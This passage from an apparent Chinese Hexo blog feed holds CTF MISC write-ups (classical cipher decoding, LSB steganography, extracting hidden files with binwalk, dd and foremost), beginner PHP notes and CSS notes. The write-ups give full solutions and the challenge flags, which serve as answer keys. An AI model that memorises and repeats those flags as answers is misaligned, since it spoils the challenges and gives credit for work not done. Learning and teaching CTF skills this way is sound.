alt="在这里插入图片描述">WYEP%5DFM~KMYET.png?raw=true)</p><p>扫描之后得到如下信息：</p><pre><code>key:AutomaticKey cipher:fftu&#123;2028mb39927wn1f96o6e12z03j58002p&#125;</code></pre><p>应该就是AutoKey那个加密，<a href="https://www.wishingstarmoye.com/ctf/autokey">解密网站</a><br>得到flag{2028ab39927df1d96e6a12b03w58002k}<br><strong>二.哈夫曼树</strong><br>霍夫曼树又称最优二叉树，是一种带权路径长度最短的二叉树。所谓树的带权路径长度，就是树中所有的叶结点的权值乘上其到根结点的路径长度（若根结点为0层，叶结点到根结点的路径长度为叶结点的层数）。树的路径长度是从树根到每一结点的路径长度之和，记为WPL=（W1<em>L1+W2</em>L2+W3<em>L3+…+Wn</em>Ln），N个权值Wi（i=1,2,…n）构成一棵有N个叶结点的二叉树，相应的叶结点的路径长度为Li（i=1,2,…n）。可以证明霍夫曼树的WPL是最小的。<hr></p><p>打开题目为：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/WR_OEE87" alt="在这里插入图片描述">~7@STVFM44K(%7DD.png?raw=true)由于是小白所以不会写哈夫曼树的脚本，只能自己画了（Q w Q）<br>    想知道咋画点击👉    <a href="https://jingyan.baidu.com/article/a501d80c16dfa0ec620f5e70.html">画法</a><br>   <img src="https://github.com/weiwanchengdege/photos/blob/master/IMG_20190415_1947502.jpg?raw=true" alt="在这里插入图片描述"><br>之后就自己对照树的结构，左0右1进行查找<br><img src="https://github.com/weiwanchengdege/photos/blob/master/YX6CJY9" alt="在这里插入图片描述">CM9K%5D%5DH8YFC%7BE%60S.png?raw=true)<br>得到flag有两种可能试试就知道那个对了。<br><strong>三.密码题</strong><br>打开：<img src="https://github.com/weiwanchengdege/photos/blob/master/7NG%7D" alt="在这里插入图片描述">E6%5BE%5BM437OU%5DQ%5BXQ6C.png?raw=true)<br>一看就知道是摩斯密码，解码得：</p><pre><code>MORSEISCOOLBUTBACONISCOOLER/CCCDDCDDDC/DDCCCCDDDCDCDCC/CDCDCCDDCDCDDDCDCDDC/DCCDDCCDDDCCDCC/CCDCDCDDDCDCDCCDCCCD/CCDCDCCDCCCDDCDCCCDCCCDCC/DDCCDCCDDCCDCCCCCCCCCCDDDDDCCCCCCCCCDDCDCCCCCDCDCCCDDDCDDCCDCDDCDDCDDDDCDDCCDCCC</code></pre><p>根据前面的提示为发现后面培根密码，根据培根密码的格式将CD转化为AB</p><pre><code>/AAABBABBBA/BBAAAABBBABABAA/ABABAABBABABBBABABBA/BAABBAABBBAABAA/AABABABBBABABAABAAAB/AABABAABAAABBABAAABAAABAA/BBAABAABBAABAAAAAAAAAABBBBBAAAAAAAAABBABAAAAABABAAABBBABBAABABBABBABBBBABBAABAAA</code></pre><p>解得：<code>DO YOU KNOW THE FOUR FENCE ZGIAHYANAUOZNXWI</code><br>英语不太好，百度翻译得：你知道四道栅栏吗？<br>再接着着解栅栏密码  （每组次数为4）：ZHANGYUXIAOWANZI<br>终于解完了，最后的提交格式弄了半小时，太坑了。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LSB隐写+画图</title>
      <link href="2019/04/10/LSB%E9%9A%90%E5%86%99+%E7%94%BB%E5%9B%BE/"/>
      <url>2019/04/10/LSB%E9%9A%90%E5%86%99+%E7%94%BB%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<p>关于<strong>LSB</strong><br><strong>一.LSB简介</strong><br>LSB(英文 least significant bit)即最低有效位。LSB加密是信息隐藏中最基本的方法。由于人们识别声音或图片的能力有限，因此我们稍微改动信息的某一位是不会影响我们识别声音或图片的。<br><strong>二.用法</strong><br>通常来说LSB加密用在无损压缩的数据格式文件中，例如图像中的bmp格式和音频的wav格式。由于这两种格式未对源数据进行有损压缩，因此可以将信息隐藏起来。<br><strong>BMP文件中的使用</strong><br>对于图像文件LSB的特征很明显，通常将信息隐藏在某一个颜色通道中。我们可以查看图片的每个像素点的RGB值，或者使用stegsolve工具进行查看。 </p><p>由于图像是由像素构成的，每个像素有8位(对于BMP图像来说),通常最后一位的变化，通过肉眼是无法察觉的<br>一道LSB隐写题，打开有张图：<br><img src="http://img-blog.csdnimg.cn/20190410192758137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">使用stegsolve工具进行查看，-&gt;分析-&gt;数据提出<br>Bit Order选择LSB Lirst  （最低有效位） ，MSB是最高有效位；分析如下<br><img src="http://img-blog.csdnimg.cn/2019041019493387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现 flag{hav e a good time!}<br>LSB隐写2：<br>打开为：<br><img src="http://img-blog.csdnimg.cn/20190410195323228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同样的套路，得到：</p><p><img src="http://img-blog.csdnimg.cn/20190410195501146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p><strong>画图题：</strong><br>打开发现有个萌妹子：</p><p><img src="http://img-blog.csdnimg.cn/20190410200137789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用winhex打开发现图片后面有很多的数据：<br><img src="http://img-blog.csdnimg.cn/20190410200318425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制下来保存为txt文件用notepad++转换一下编码</p><p><img src="http://img-blog.csdnimg.cn/20190410200522981.png" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190410200659463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就是取坐标，用Notepad++的替换功能：</p><p><img src="http://img-blog.csdnimg.cn/20190410200929937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另存为txt文件，接下来使用一个画图工具：gnuplot（百度 下载地址很多）把txt文件拖进bin目录下，然后执行命令：<br>plot”文件名.txt”</p><p><img src="http://img-blog.csdnimg.cn/2019041020172961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回车：<img src="https://img-blog.csdnimg.cn/20190410201740269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫描二维码得到flag:<img src="http://img-blog.csdnimg.cn/20190410201959720.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">。。。<br>。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LSB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习记录</title>
      <link href="2019/04/07/PHP%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2019/04/07/PHP%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><strong>1.PHP概述</strong></p><ul><li>php的目标是允许网络开发人员快速编写动态页面</li><li>主要被用于开发各种网站程序</li><li>是脚本语言，不需要事先编译，在服务器运行。</li></ul><p> <strong>2.web工作原理</strong><br> web服务器： 浏览器-&gt;输入url地址-&gt;显示网站内容<br> 服务器是一种软件，把安装运行了服务器的电脑叫主机（host）</p><p> <img src="https://github.com/weiwanchengdege/photos/blob/master/20190406225149649.png?raw=true" alt="在这里插入图片描述"><br> <strong>3.php脚本语言</strong><br> 开始: <?php 结束: ?><br> <?php ?>表示进入php模式。</p><ul><li>PHP代码可以嵌入到html代码中任何位置，并且可以嵌入任意多个。</li><li>文件末尾的?&gt;结束标志可以省略</li><li> 一些PHP语句的结尾要加上;表示一句话的结束</li><li>结束标记?&gt;就隐含了一个;</li></ul><p> 1)多行注释<br>   /*<br>    多行注释<br>   */<br>  2)单行注释<br>   //我是单行注释<br>   3.变量<br> 变量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器<br>   变量用于存储 数字、文本字符串 或者数组这些数据!</p><pre><code>  $变量名=数据(值)</code></pre><p>1.变量的销毁</p><pre><code> unset($变量名称)  $and1=1;  unset($and1);//销毁$and变量  echo $and1;//提示出错，因为变量已经被销毁了！   </code></pre><p>2 .变量的命名规则<br>  1)变量名称严格区分大写</p><pre><code>   $name,$NAME,$Name都是不同的变量</code></pre><p>   2）</p><p>   字母或者下划线开头<br>   后面接任意数量的字母数字下划线都可以!</p><p>   错误的命名方式：<br>    $1name  错误点：以数字开头了<br>    $n ame  错误点：中间有空白字符<br>   总结一下：变量名只能包含 字母 数字 下划线 并且必须以字母或者下划线开头！</p><p>  3)最好不要用一些关键字作为变量名称(因为在其他的编程语言里面是完全不被允许的)!<br>  <strong>4.变量类型</strong><br>  1.变量类型简介<br>    1）bool (布尔型)<br>       <code>$a=true;</code><br>    <code>var_dump($a);</code><br>    往变量里面存true或者false，那么这个变量就是布尔型了<br>    2）int (整型)<br>    往变量里面存整数，那么这个变量就是整型变量啦！<br>    3）float (浮点型，也称double)<br>    往变量里面存小数，那么这个变量就是浮点型数据了!<br>   <code> $a=1.1;</code><br><code>    var_dump($a);</code><br>  4）string (字符串)<br>    字符串就是一系列的字符组成串在一起！<br>    1单引号：</p><pre><code>   $b=1;    $a=&#39;test$bdwqd\&#39;wqdqw&#39;;    var_dump($a);    echo $a;</code></pre><p>  在定义一些简单的字符串的时候使用单引号这种方法效率比较高！<br>    2双引号</p><pre><code>   $b=100;    $a=&#39;te$bst......&#39;;    $a=&quot;te&#123;$b&#125;st......&quot;;    var_dump($a);    echo $a;</code></pre><p> 3定界符</p><pre><code>  $b=200;    $a=&lt;&lt;&lt;www    dwqdqwdwq&#123;$b&#125;dwqdqdqdqdwqdwqcwcfwefwefcscwecwefwdqwdqdefwefwefewfwe    www;    var_dump($a);</code></pre><p>   3定界符</p><p>$b=200;<br>$a=&lt;&lt;&lt;www<br>dwqdqwdwq{$b}dwqdqdqdqdwqdwqcwcfwefwefcscwecwefwdqwdqdefwefwefewfwe<br>www;<br>var_dump($a);</p><p>4）NULL</p><pre><code> null表示一个变量没有值，表示空    将变量直接赋值为null    声明的变量尚未被赋值    被unset函数销毁的变量    $a=1111;    unset($a);    var_dump($a);</code></pre><p><strong>5.常量</strong><br> 1.概念<br>  常量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器<br> 2.定义和使用<br>  define(‘常量名称’,常量值) 或者 define(“常量名称”,常量值)<br>  常量的命名：<br>   1)和变量一样 只能包含字母数字下划线 并且必须以 字母或者下划线开头<br>   2)按照惯例常量名字总是大写的<br>   3)自定义的常量是严格区分大小写的！<br>  defined()函数来检查是否定义了某个常量<br> 3.常量和变量的区别<br>  1)常量前面没有美元符号($)<br>  2)常量只能用define()函数定义，不能通过赋值语句<br>  3)<strong>****</strong>常量可以不用理会变量范围的规则而在任何地方定义和使用<br>  4)常量一旦被定义就不能被重新定义或者取消定义<br>  5)常量的值只能是bool,int,float,string类型<br> 4.预定义常量<br>  预定义常量说白了就是我们的PHP内核已经帮我们定义好了的常量!</p><p>  其中有的预定义常量是一__开头的，这些预定义常量我们又叫它魔术常量</p><p>   代码所在的位置不同他的值也是不同的，所以它加 魔术常量<br>  八个常用的魔术常量<br>   <a href="http://php.net/manual/zh/language.constants.predefined.php">http://php.net/manual/zh/language.constants.predefined.php</a><br>  预定义常量是不区分大小写的！<br>  <strong>6.运算符</strong><br> 概述：<br>  说白了就是一些符号，这些符号可以将变量或者数据执行某中运算！<br> 1.算术运算符<br>  1)+</p><pre><code> $a=1;   $b=2;   $c=$a+$b;   echo $c;</code></pre><p>2)-<br>   第一个意思： 减号</p><pre><code> $a=10;    $b=2;    $c=$a-$b;    echo $c;</code></pre><p> 第二个意思： 取反</p><pre><code>$a=1;$b=-$a;echo $b;//-1echo &#39;&lt;br /&gt;&#39;;echo $a;//1 注意</code></pre><p>：取反并不会影响到被取反变量本身的值!<br>  3)* 乘号</p><pre><code>   $a=4;   $b=2;   $c=$a*$b;   echo $c;</code></pre><p>4)/ 除号</p><pre><code>   $a=10;   $b=2;   $c=$a/$b;   echo $c;</code></pre><p>5)% 取模</p><pre><code>   $a=12;   $b=2;   echo $a%$b;</code></pre><p> 6)++ 自增<br>   前++<br>    当在一个语句里面需要使用到被自增的变量的值的时候，前++会先执行自增,然后再返回自增之后的值！</p><pre><code>  $a=10;    echo ++$a;//11</code></pre><p>   后++<br>    当在一个语句里面需要使用到被自增的变量的值的时候，后++会先返回变量的值然后再去执行自增</p><pre><code>   $a=10;    //++$a;//$a=$a+1;    //$a++;//$a=$a+1;    echo $a++;//echo $a;$a=$a+1;    echo &#39;&lt;br /&gt;&#39;;    echo $a;//11</code></pre><p> 注意：</p><pre><code>$a=10;   ++$a;//这种情况不需要用到自增变量值的时候，和后++无区别   echo $a;</code></pre><p> 7)– 自减<br>   前–</p><pre><code>$a=10;//$a--;//$a=$a-1; 和--$a没区别;echo --$a;//$a=$a-1;echo $a;echo &#39;&lt;br /&gt;&#39;;echo $a;</code></pre><p>   后–</p><pre><code>    $a=10;    //$a--;//$a=$a-1; 和--$a没区别;    echo $a--;//echo $a;$a=$a-1;    echo &#39;&lt;br /&gt;&#39;;    echo $a;  注</code></pre><p>意：自增或者自减是对变量而言的！<br>2.字符串运算符<br>  . 连接运算符</p><pre><code>$a=&#39;孙胜利&#39;;$b=&#39;测试字符串连接符&#39;;echo $a.$b;</code></pre><p> 3.赋值运算符<br><code>  =</code><br>   把右边的值赋给左边的变量<br> <code>  $a=1;</code><br>   二元运算符</p><p>   表达式是 PHP 最重要的基石。在 PHP 中，几乎所写的任何东西都是一个表达式。简单但却最精确的定义一个表达式的方式就是“任何有值的东西”。</p><pre><code>   +=   $a=1;   $b=2;   $a+=$b;//$a=$a+$b;   echo $a;  -=   $a=2;   $b=1;   $a-=$b;//$a=$a-$b   echo $a；</code></pre><p>  4.比较运算符<br>  概念：<br>  对操作数（按照比较运算符的要求,规则）进行比较<br>   如果比较出的结果满足比较运算符的要求那么结果就是true(真，成立，满足),否则就是false（假，不成立,不满足）<br>  PHP中规定：<br>   使用echo输出布尔类型值的时候<br>    echo true;它在页面中会输出1<br>    echo false;它会在页面中什么都不输出<br>    规定的，记住就好！所以说我们在测试的过程中如果需要输出布尔类型值的时候我们最好使用var_dump()来输出更明了的结果！</p><p>  1)== 值是否相等<br>   如果值相等则就是 true（真，成立）<br>   如果值不相等那么就是false（假，不成立）</p><pre><code>$a=1;   $b=1;   var_dump($a==$b);//true</code></pre><p> 2)=== 全等（值要相等，类型也要相等）<br>   如果两边操作数的值 全等那么就是true否则就是false</p><pre><code> $a=11;   $b=&#39;11&#39;;   //var_dump($a==$b);//true   var_dump($a===$b);//false</code></pre><p>3)!= 值是否不相等<br>   如果两边操作数的值不相等那么就是true，否则就是false</p><pre><code>$a=1;   $b=11;   var_dump($a!=$b);//true</code></pre><p> 4)&lt;&gt; 同上<br> 5)!== 不全等<br>   如果两边的操作数不全等那么就是true，否则就是false<br>   /*</p><pre><code>$a=1111;   $b=2;   var_dump($a!=$b);//true   var_dump($a!==$b);//true   */   $a=11;   $b=&#39;11&#39;;   var_dump($a!=$b);//false   var_dump($a!==$b);//true,$a不全等于$b</code></pre><p> 6)&lt; 小于<br>   比较两边操作数的值，前面的是否小与后面的</p><pre><code>   $a=1;   $b=1;   var_dump($a&lt;$b);//false,$a小与$b</code></pre><p>这句话正确还是错误</p><pre><code>7)&gt; 大于   $a=10;   $b=1;   var_dump($a&gt;$b);</code></pre><p>8)&lt;= 小于等于</p><pre><code> $a=1;   $b=1;   var_dump($a&lt;=$b);//$a小与等于$b就是true,否则就是false</code></pre><p> 9)&gt;= 大于等于</p><pre><code>$a=2;   $b=1;   var_dump($a&gt;=$b);//true</code></pre><p><strong>5.逻辑运算符</strong><br>  概念：<br>   对表达式进行逻辑运算，运算出的结果是布尔类型的值（true,false）<br>   要求：<br>    参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算！<br>  1)逻辑与<br>   and 或者 &amp;&amp;<br>    运算规则：<br>     左右两边的表达式的值都为true的时候，运算的结果就是true<br>     否则只要其中任意一个为false，运算的结果就是false;<br>    现实举例：<br>     true 及格<br>     false 不及格<br>     左右两边的表达式就是我们要考试的科目;<br>     要求：当语文和数学都及格的时候那么，最终的结果才能够通过(true),否则就是不通过(false)</p><pre><code> $a=false;//语文 $b=true;//数学 var_dump($a &amp;&amp; $b);</code></pre><p>   中间隐含一个问题：“短路”,运算符的优先级的问题！<br>  2)逻辑或<br>   or 或者 ||<br>    运算规则：<br>     左右两边的表达式的值有一个为true，运算的结果就是true<br>     ，只有当两边的值都是false的时候，结果才会是false</p><pre><code> $a=false;//语文 $b=true;//数学 var_dump($a || $b);</code></pre><p>   现实举例：<br>    要求：当语文和数学有一门及格那么最终的结果就是通过true<br>   中间隐含一个问题：“短路”,运算符的优先级的问题！<br>  3)逻辑异或<br>   xor<br>    运算规则：<br>     左右两边的表达式的值不一样的时候结果就是true,如果一样那么运算的结果就是false</p><pre><code>$a=false;$b=false;var_dump($a xor $b);</code></pre><p>  4)逻辑非<br>   !<br>    运算规则：<br>     将原来表达式的值否定掉，原来是true，那么结果就是false<br>      原来是false，那么结果就是true</p><ul><li>5)运算符<br>   1)? :<br>三元运算<br>格式：<br> 表达式1 ? 表达式2 : 表达式3;<br> 如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3<br>$a=false ? 10 : 20;<br>echo $a;//20</li></ul><ol start="2"><li>可以把系统的命令放在里面执行！<br>涉及到跨平台:</li></ol><pre><code>    $a=`ipconfig`;windows环境下    $b=`ifconfig`;liunx环境下    var_dump($b);</code></pre><p> 3)@<br>   屏蔽表达式可能发生错误！<br>   echo @$a;<br>   当然，实际在哪些地方应用，我们用到大家就知道了！<br>  4)=&gt;<br>  5)-&gt;<br>  6)instanceof<br> 8.运算符的优先级<br>  优先级的概念：<br>   谁的优先级别高就先算谁！<br>  结合方向：<br>   规定了从那个方向开始算的问题！</p><p>  优先级这个概念只要知道一些基本的常用的就可以了，因为我们在实际开发中几乎没有那么需要写非常复杂的表达式，<br>  让我们去考虑先算谁，后算谁的问题！</p><p>  优先级归纳:<br>   1)[无]递增递减<br>   2)[右]逻辑非!<br>   3)[左]乘，除，取余<br>   4)[左]加，减，字符串连接符<br>   5)[无]包含大于号或者小于号的比较运算符<br>   6)[无]不包含大于号或者小于号的比较运算符<br>   7)[左]逻辑与&amp;&amp;<br>   8)[左]逻辑或||<br>   9)[左]? :<br>   10)[右]赋值运算符<br>   12)[左 ]逻辑异或xor<br>  圆括号的作用：<br>   用圆括号可以将表达式里面的某一块看成一个整体！<br>  *使用括号可以增强代码的可读性。<br><strong>6.流程控制</strong><br>if语句<br>switch语句<br>循环语句<br>与C语言基本相同就不再详写。<br><em>特殊的流程控制语句</em><br> 1.break语句<br>  作用：用于switch语句，for，while，do…while，foreach，用于中断这些语句！<br>     后面可以接上一个数字来表示跳出几层循环！默认不加就是跳出当前循环语句！<br> 2.continue语句<br>  作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！<br> 3.exit()语句<br>  作用：结束当前整个程序的执行！<br>  die()语句作用同上！</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分离图片中的隐藏文件方法总结</title>
      <link href="2019/04/05/%E5%88%86%E7%A6%BB%E5%9B%BE%E7%89%87%E4%B8%AD%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>2019/04/05/%E5%88%86%E7%A6%BB%E5%9B%BE%E7%89%87%E4%B8%AD%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>CTF中经常会碰见图片隐藏文件的题目，今天就来总结一下分离隐藏文件的几种方法。</p><h4 id="1、图片分析"><a href="#1、图片分析" class="headerlink" title="1、图片分析:"></a>1、图片分析:</h4><p>如图为CTF题目中一个隐藏文件的图片<br><img src="https://img-blog.csdnimg.cn/20210207003838659.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>首先对图片进行分析，这里介绍一个工具binwalk（kali中是自带的，也可以下载到windows中使用）。</p><p>使用方法：binwalk + 文件路径/文件名</p><pre><code class="bash">binwalk 1.jpg</code></pre><p>执行命令后，binwalk就会自动分析这个jpg文件：<br><img src="https://img-blog.csdnimg.cn/20210207004045765.png"><br>从分析的结果看，这个jpg文件隐藏着一个zip文件，从48221块偏移开始就是zip文件。</p><h4 id="2、如何分离："><a href="#2、如何分离：" class="headerlink" title="2、如何分离："></a>2、如何分离：</h4><p>在得到隐藏信息后，改如何把zip文件分离出，下面介绍几种方法：</p><h5 id="2-1、binwalk-分离："><a href="#2-1、binwalk-分离：" class="headerlink" title="2.1、binwalk 分离："></a>2.1、binwalk 分离：</h5><p>还是使用binwalk工具，使用dd命令分离出隐藏文件：</p><pre><code class="bash">dd if=1.jpg of=1.zip skip=48221 bs=1</code></pre><p>解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过48221个块后开始复制，bs设<br>置每次读写块的大小为1字节<br><img src="https://img-blog.csdnimg.cn/20210207214457253.png" alt="在这里插入图片描述"><br>执行后会得到一个1.zip文件。</p><h5 id="2-2、foremost-工具分离："><a href="#2-2、foremost-工具分离：" class="headerlink" title="2.2、foremost 工具分离："></a>2.2、foremost 工具分离：</h5><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载使用，Linux可以通过下面命令安装使用：</p><pre><code class="bash"> apt-get install foremost</code></pre><p>Linux下分离文件的命令为：</p><pre><code class="bash"> foremost 1.jpg</code></pre><p>执行命令后，foremost会生成output目录存放分离出的文件。</p><p>Win下是把文件直接拖到 foremost.exe上，也会生成output目录存放分离出的文件。<br><img src="https://img-blog.csdnimg.cn/20210207222004236.png" alt="在这里插入图片描述"></p><h5 id="2-3、hex编辑器分离："><a href="#2-3、hex编辑器分离：" class="headerlink" title="2.3、hex编辑器分离："></a>2.3、hex编辑器分离：</h5><p>hex编辑器有很多，win下有用得较多的winhex、UltraEdit等，linux下有hexeditor等。这里我们以winhex为例来手动分离。</p><p>一个完整的 jpg 文件由 FF D8 开头，FF D9结尾，图片查看器会忽略 FF D9 以后的内容，因此可以在 jpg 文件中加入其他文件。</p><p>经过上面的分析， 知道图片中隐藏了zip文件，zip文件的开头16进制为504B0304，先搜索16进制文本 FFD9，然后后面跟着504B0304，于是就可以从 50 开始，复制到最后（因为这里只有一个zip，所以复制到最后），另存为新文件，就得到了隐藏的压缩包。<br><img src="https://img-blog.csdnimg.cn/20210207233444505.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021020723351714.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210207233820560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2-4、改后缀名："><a href="#2-4、改后缀名：" class="headerlink" title="2.4、改后缀名："></a>2.4、改后缀名：</h5><p>分析知道隐藏文件是zip后，有一个简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS练习小结</title>
      <link href="2019/03/31/CSS%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2019/03/31/CSS%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><strong>css引入方式</strong></p><p> 内联引入</p><pre><code>   &lt;body&gt;         &lt;div style=&quot;color:red;width:100px;heigh:100px;&quot;&gt;苹果&lt;/div&gt;     &lt;div style=&quot;color:green;width:100px;heigh:100px;&quot;&gt;苹果&lt;/div&gt;     &lt;div style=&quot;color:gray;width:100px;heigh:100px;&quot;&gt;核桃&lt;/div&gt;     &lt;div style=&quot;color:yellow;width:100px;heigh:100px;&quot;&gt;香蕉&lt;/div&gt;    &lt;/body&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/201903301714023.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr>内部引入<pre><code> &lt;style&gt;         div&#123;          color:red;            width:100px;        height:100px;             &#125;    &lt;/style&gt;     &lt;/head&gt;     &lt;body&gt;    &lt;div&gt;苹果&lt;/div&gt;    &lt;/body&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190330171658457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><hr><br>外部引入<br><img src="http://img-blog.csdnimg.cn/20190330180205676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><hr><p><img src="http://img-blog.csdnimg.cn/20190330175808917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><strong>css选择器</strong><br>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明:<br>选择器通常是您需要改变样式的 HTML 元素。<br>   选择器主要由有四大类：</p><ul><li>基本选择器</li><li>组合选择器</li><li>属性选择器</li><li>伪元素选择器</li></ul><p><strong>基本选择器：</strong><br>通配符:全部都被标注！<br>标签div：<br>div{<br>     }只有对应的div才被标注<br> <img src="http://img-blog.csdnimg.cn/20190330212130114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="有唯一性"><br>id选择器：<img src="http://img-blog.csdnimg.cn/20190330212604222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p>class：<img src="http://img-blog.csdnimg.cn/2019033021335212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="没有唯一性性"></p><hr>**css原理**<p>1.优先原理：后解析的内容会覆盖掉之前的内容<br>2.继承原则：嵌套里面的标签拥有外部标签的某些样式；子元素可以继承父元素的属性。<br>优先原则：-》选择器<br>1.同一个选择器：从上往下执行。<br><img 